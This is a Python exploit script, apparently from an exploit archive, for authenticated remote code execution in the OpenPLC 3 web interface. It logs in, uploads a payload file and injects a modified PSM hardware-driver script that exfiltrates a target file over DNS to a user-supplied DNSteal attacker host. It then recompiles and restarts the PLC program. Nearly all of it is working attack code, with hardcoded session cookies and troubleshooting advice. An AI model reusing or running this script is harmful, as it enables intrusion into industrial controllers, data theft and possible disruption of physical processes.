# Exploit Title: OpenPLC 3 - Remote Code Execution (Authenticated)
# Date: 25/04/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.openplcproject.com/
# Software Link: https://github.com/thiagoralves/OpenPLC_v3
# Version: OpenPLC v3
# Tested on: Ubuntu 16.04,Debian 9,Debian 10 Buster

#/usr/bin/python3

import requests
import sys
import time
import re

if len(sys.argv) != 6:
    print("[!] Wrong number of parameters provided.")
    print("[!] Usage: python3 attack.py <PLC IP Address> <OpenPLC Port> <OpenPLC Username> <OpenPLC Password> <DNSteal IP Address>")
    sys.exit(1)

openplc_url = "http://" + sys.argv[1] + ":" + sys.argv[2]
login_url = openplc_url + '/login' 
dashboard_url = openplc_url + '/dashboard'
programs_url = openplc_url + "/programs"
upload_program_url = openplc_url + "/upload-program" 
start_plc_program_url = openplc_url + '/start_plc'
stop_plc_program_url = openplc_url + '/stop_plc'
compile_program_url = openplc_url + '/compile-program?file=' 
compile_logs_url = openplc_url + '/compilation-logs'
hardware_driver_url = openplc_url + "/hardware"

openplc_username = sys.argv[3]
openplc_password = sys.argv[4]
dnsteal_ip = sys.argv[5]

session = requests.Session()


def send_request(method, url, headers=None, cookies=None, data=None):
    max_retries = 5
    
    for attempt in range(1, max_retries + 1):
        try:

            if method.upper() == "POST":
                response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            elif method.upper() == "GET":
                response = session.get(url, timeout=5)
            else:
                print("[!] Unknown method. Please choose GET or POST.")
                return None

            if response.status_code == 200:
                time.sleep(2)
                return response
            else:
                print(f"[!] Received unexpected status code {response.status_code} from server.")

        except requests.exceptions.Timeout:
            print("[!] Request timed out. No response within 5 seconds.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed due to an error: {e}")
        
        if attempt < max_retries:
            print(f"[!] Retrying in 2 seconds...")
            time.sleep(2)
        else:
            print("[!] Maximum number of attempts reached. Exiting.")
            print("[!] Resquest to OpenPLC may occasionally fail due to timeouts. This happens because OpenPLC occasionally does not respond to certain HTTP requests, especially when the target system or OpenPLC itself is busy. To reduce the likelihood of failure, close any open OpenPLC web interface tabs in your browser.")
            print("[!] If the problem persists, verify that your OpenPLC settings are correct. In the settings section, you should have only the Modbus server enabled, and all other interfaces disabled. After making changes, don't forget to scroll down the page and click on 'Save changes' at the bottom.")
            sys.exit(1)


def auth(openplc_url, username, password):
    print('[+] Checking if host '+ openplc_url +' is up...')
    send_request("GET", login_url)
    print('[+] Host is up and reachable.')

    print('[+] Trying to authenticate with credentials '+ username +':'+ password +'...')   
    credentials = {
        'username': username,
        'password': password
    }

    login_response = send_request("POST", login_url, None, None, credentials)
    match = re.search(r"<div class='login-page'>", login_response.text)

    if (login_response.status_code == 200 and not match):
        print('[+] Login successful.')
        match = re.search(r"<b>File:</b>\s*([^<]+)", login_response.text)
        if match:
            current_program = match.group(1).strip()
            return current_program
        else:
            print("[!] No PLC program found.")
            sys.exit(1)

    else:
        print('[!] Login failed.')
        print("Please check your credentials and try again. If the credentials are correct, the issue could be that the target system's time is out of sync. This issue may occur if the target system was powered off or has incorrect time settings. To fix this, navigate to /embedded-device/scripts_config and run the 'update_timedate.sh' script to update the system time.")
        sys.exit(1)  


def injection(openplc_url, payload_file):
    print('[+] Uploading the payload into OpenPLC...')
    with open(payload_file) as f: injection = f.read()
    cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvgPw.qwEcF3rMliGcTgQ4zI4RInBZrqE"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------210749863411176965311768214500", "Origin": openplc_url, "Connection": "close", "Referer": upload_program_url, "Upgrade-Insecure-Requests": "1"} 
    data = """-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name="file"; filename="{}"\r\nContent-Type: application/vnd.sailingtracker.track\r\n\r\n{}\n\r\n-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload Program\r\n-----------------------------210749863411176965311768214500--\r\n""".format(payload_file, injection)
    upload = send_request("POST", upload_program_url, headers, cookies, data)

    match = re.search(r'value=\'(.*?)\.st\'', upload.content.decode('utf-8'))
    payload_st_file = match.group(1)+'.st'

    return payload_st_file


def connection(openplc_url, current_PLC_program, modified_psm_script, payload_st_file, dnsteal_ip, target_file_path, target_file_name):
    print("[+] Stopping the current PLC program...")
    send_request("GET", stop_plc_program_url)

    print("[+] Injecting python script into the OpenPLC hardware PSM...")
    with open(modified_psm_script) as f: injection = f.read()

    pattern_executor = r'executor = "[^"]+"'
    pattern_dnsteal = r'DNSteal_ip = "[^"]+"'
    pattern_target_path = r'target_path = "[^"]+"'
    pattern_target_name = r'target_name = "[^"]+"'

    injection = re.sub(pattern_executor, f'executor = "{payload_st_file}"', injection)
    injection = re.sub(pattern_dnsteal, f'DNSteal_ip = "{dnsteal_ip}"', injection)
    injection = re.sub(pattern_target_path, f'target_path = "{target_file_path}"', injection)
    injection = re.sub(pattern_target_name, f'target_name = "{target_file_name}"', injection)

    send_request("GET", hardware_driver_url)

    cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvyFA.2NQ7ZYcNZ74ci2miLkefHCai2Fk"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------289530314119386812901408558722", "Origin": openplc_url, "Connection": "close", "Referer": hardware_driver_url, "Upgrade-Insecure-Requests": "1"}
    data = "-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"hardware_layer\"\r\n\r\npsm_linux\r\n-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"custom_layer_code\"\r\n\r\n{}\r\n\r\n-----------------------------289530314119386812901408558722--".format(injection)
    send_request("POST", hardware_driver_url, headers, cookies, data)

    print("[+] Recompiling the current PLC program, this may take a few minutes...")
    send_request("GET", compile_program_url + current_PLC_program)
    while(not("Compilation finished successfully!" in send_request("GET", compile_logs_url).text)):
        time.sleep(2)
        
    print("[+] Compilation finished successfully")
    send_request("GET", dashboard_url)
    
    print("[+] Starting the PLC program...")
    send_request("GET", start_plc_program_url)
    print("[+] File sent successfully.")

        

current_plc_program = auth(openplc_url, openplc_username, openplc_password)
payload_st_file = injection(openplc_url, "payload.sh")
connection(openplc_url, current_plc_program, "modified_psm_driver.py", payload_st_file, dnsteal_ip, "/etc/OpenPLC_v3/webserver/st_files", current_plc_program)
            